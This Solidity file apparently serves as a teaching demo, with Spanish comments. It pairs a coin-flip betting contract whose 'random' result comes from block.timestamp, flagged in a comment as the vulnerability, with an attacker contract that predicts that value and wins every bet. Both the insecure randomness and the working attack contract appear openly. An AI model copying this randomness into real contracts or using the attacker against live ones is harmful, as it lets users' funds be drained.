// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

// CONTRATO VULNERABLE
contract CoinFlipInsecure {
    uint public balance = 10 ether;
    event Resultado(bool gano, uint numeroAleatorio, uint suposicion);

    function flipCoin(uint _guess) public payable {
        require(msg.value == 1 ether, "Debes apostar 1 Ether");
        uint randomNumber = uint(block.timestamp) % 2; // VULNERABILIDAD

        if (randomNumber == _guess) {
            balance -= 1 ether;
            (bool sent, ) = msg.sender.call{value: 2 ether}("");
            require(sent, "Fallo al enviar Ether");
            emit Resultado(true, randomNumber, _guess);
        } else {
            balance += 1 ether;
            emit Resultado(false, randomNumber, _guess);
        }
    }
    receive() external payable {}
}

// CONTRATO ATACANTE
contract CoinFlipAttacker {
    CoinFlipInsecure public vulnerableContract;

    constructor(address payable _vulnerableContract) {
        vulnerableContract = CoinFlipInsecure(_vulnerableContract);
    }

    function attack() public payable {
        require(msg.value == 1 ether, "Necesita 1 ETH para la apuesta");
        uint guess = uint(block.timestamp) % 2; // PREDICCION
        vulnerableContract.flipCoin{value: 1 ether}(guess);
    }
    receive() external payable {}

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
